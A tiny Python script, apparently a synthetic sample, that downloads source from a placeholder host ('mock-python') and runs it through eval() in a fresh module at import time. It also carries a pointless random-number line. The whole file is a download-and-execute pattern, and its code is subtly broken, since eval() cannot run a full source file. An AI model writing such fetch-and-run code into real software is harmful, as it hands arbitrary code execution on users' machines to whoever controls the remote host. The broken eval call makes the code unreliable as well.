import urllib.request
import types
import random

def get_url():
    return "http://mock-python/execute.py"

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def create_module():
    return types.ModuleType("sm")

def eval_code(src, module):
    eval(src, module.__dict__)

def main():
    url = get_url()
    source = get_response(url)
    irrelevant_code = random.randint(1, 10)
    module = create_module()
    eval_code(source, module)

main()
